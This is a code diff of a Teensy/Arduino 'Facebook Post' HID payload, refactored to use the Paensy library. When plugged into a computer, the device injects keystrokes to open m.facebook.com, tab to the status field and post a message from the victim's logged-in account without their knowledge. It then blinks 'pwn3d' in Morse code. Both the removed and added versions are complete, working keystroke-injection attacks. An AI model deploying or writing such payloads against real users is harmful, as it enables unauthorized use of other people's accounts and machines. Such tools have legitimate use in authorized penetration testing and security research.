@@ -1,205 +1,106 @@
 /***
- *        ______                __                __      ____             __ 
- *       / ____/___ _________  / /_  ____  ____  / /__   / __ \____  _____/ /_
- *      / /_  / __ `/ ___/ _ \/ __ \/ __ \/ __ \/ //_/  / /_/ / __ \/ ___/ __/
- *     / __/ / /_/ / /__/  __/ /_/ / /_/ / /_/ / ,<    / ____/ /_/ (__  ) /_  
- *    /_/ __ \__,_/\___/\_____.___/\____/\____/_/|_|  /_/    \____/____/\__/  
- *       / /_  __  __   / __ \____  __  _________  __                         
- *      / __ \/ / / /  / / / /_  / / / / / ___/ / / /                         
- *     / /_/ / /_/ /  / /_/ / / /_/ /_/ / /  / /_/ /                          
- *    /_.___/\__, /   \____/ /___/\__,_/_/   \__,_/                           
- *          /____/                                                            
+ *    ______             _                 _     ______         _   
+ *    |  ___|           | |               | |    | ___ \       | |  
+ *    | |_ __ _  ___ ___| |__   ___   ___ | | __ | |_/ /__  ___| |_ 
+ *    |  _/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ / |  __/ _ \/ __| __|
+ *    | || (_| | (_|  __/ |_) | (_) | (_) |   <  | | | (_) \__ \ |_ 
+ *    \_| \__,_|\___\___|_.__/ \___/ \___/|_|\_\ \_|  \___/|___/\__|
+ *                                                                  
+ *                                                                  
+ *     _             _____                                          
+ *    | |           |  _  |                                         
+ *    | |__  _   _  | | | |_____   _ _ __ _   _                     
+ *    | '_ \| | | | | | | |_  / | | | '__| | | |                    
+ *    | |_) | |_| | \ \_/ // /| |_| | |  | |_| |                    
+ *    |_.__/ \__, |  \___//___|\__,_|_|   \__,_|                    
+ *            __/ |                                                 
+ *           |___/                                                  
  */
-
-// LED pin number, 13 for 3.1
-// 11 for 2 and 2.x
-int LED_PIN = 13;
-
-// delay length (in ms)
-int ds = 200;
-// morse delay length (in ms)
-int morseD = 250;
+ 
+#include <paensy.h>
 
 void setup() {
   
-  // let it initialize
-  delay(6000);
+  // Configure the delay that everything else scales off of.
+  SetDelay(200);
+  // Configure the delay that the Morse code uses.
+  SetMorseDelay(250);
   
-  // put the pin into output mode
+  // Perform an initial delay to give the USB time to prepare.
+  PerformInitDelay();
+  
+  // LED pin number, 13 for 3.1
+  // 11 for 2 and 2.x
+  SetLEDPin(13);
+  
+  // Put the pin into output mode
   pinMode(LED_PIN, OUTPUT);
   
-  // turn on the LED pin so we know it's running
+  // Turn on the LED pin so we know the device is running.
   digitalWrite(LED_PIN, HIGH);
+  
+  // Navigate to the mobile version to the site as it's easier to traverse using a keyboard.
+  RunCommand("http://m.facebook.com/");
+  
+  delay(3000);
+  
+  // Tab our way to statuses button.
+  PressKey(KEY_TAB, 8);
+  
+  // Go to the statuses page.
+  PressKey(KEY_ENTER, 1);
   
   delay(1000);
   
-  // windows key + R = run
-  sendCmd(KEY_R);
+  // Type our Facebook message.
+  TypeLn("Automated Facebook post payload - https://github.com/Ozuru/Paensy/ and http://www.malware.cat/ for more information!");  
   
-  delay(ds/3);
+  // Tab our way to the post button.
+  PressKey(KEY_TAB, 10);
   
-  // generally mobile has less things to tab through than the regular version
-  typeln("http://m.facebook.com/");
+  delay(1000);
   
-  delay(ds * 5);
+  // Post the status.
+  PressKey(KEY_ENTER, 1);
   
-  // tab our way to statuses button
-  repeatKey(KEY_TAB, 8);
+  delay(1000);
   
-  delay(ds/2);
-  
-  k(KEY_ENTER);
-  
-  // type our message 
-  typeln("Automated Facebook post payload - https://github.com/Ozuru/Teensy/ and http://www.malware.cat/ for more information!");  
-   
-  repeatKey(KEY_TAB, 9);
-  
-  delay(ds);
-   
-  k(KEY_ENTER);
-  
-  delay(ds);
-   
-  ctrl(KEY_W); 
+  // Close the tab.
+  Ctrl(KEY_W); 
    
 }
 
 void loop() {
- flutter();
- // celebratory flutterring of LED commence
- dot();
- dash();
- dash();
- dot();
- // p
- dot();
- dash();
- dash();
- //w
- dash();
- dot();
- //n
- dot();
- dot();
- dot();
- dash();
- dash();
- //3
- dash();
- dot();
- dot();
- //d
- flutter();
- // whoop there it is (again)
+ // Celebratory LED fluttering.
+ LED_Flutter(200, 10);
  
-}
-
-void repeatKey(int Key, int amount) {
- for(int i = 0; i < amount; i++) {
-  k(Key); 
- }
-}
-
-void typeln(String chars)
-{
-  // gotta make our own println function
-  Keyboard.print(chars);
-  delay(ds);
-  Keyboard.println("");
-  delay(ds * 4);
-}
-
-void typeFast(String chars)
-{
-  // gotta make our own println function but fastah
-  Keyboard.print(chars);
-  delay(5);
-  Keyboard.println("");
-  delay(5);
-}
-
-void sendCmd(int key)
-{
-  mod(MODIFIERKEY_GUI, key);
-  delay(ds);
-}
-
-void alt(int key)
-{
-  mod(MODIFIERKEY_ALT, key);
-}
-
-void ctrl(int key)
-{
-  mod(MODIFIERKEY_CTRL, key);
-}
-
-void k(int key)
-{
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(50);
-  
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(50);
-}
-
-
-// morse code dot
-void dot() { 
- digitalWrite(LED_PIN, HIGH);
- delay(morseD);
- digitalWrite(LED_PIN, LOW);
- delay(morseD);
-}
-
-// morse code dash
-void dash() {
- digitalWrite(LED_PIN, HIGH);
- delay(morseD * 3);
- digitalWrite(LED_PIN, LOW);
- delay(morseD);
-}
-
-// induce a seizure in the observer - #prostrats  
-void flutter() {
-  
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
- digitalWrite(LED_PIN, HIGH);
- delay(100);
- digitalWrite(LED_PIN, LOW);
- delay(100);
+ // P
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ LED_MorseDot();
  
-}
+ // W
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ 
+ // N
+ LED_MorseDash();
+ LED_MorseDot();
 
-// custom modifier method
-void mod(int mod, int key)
-{
-  Keyboard.set_modifier(mod);
-  Keyboard.send_now();
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(ds);
-
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.send_now();
-  delay(ds);
+ // 3
+ LED_MorseDot();
+ LED_MorseDot();
+ LED_MorseDot();
+ LED_MorseDash();
+ LED_MorseDash();
+ 
+ // D
+ LED_MorseDash();
+ LED_MorseDot();
+ LED_MorseDot();
+ 
+ // Flutter again.
+ LED_Flutter(200, 10); 
 }
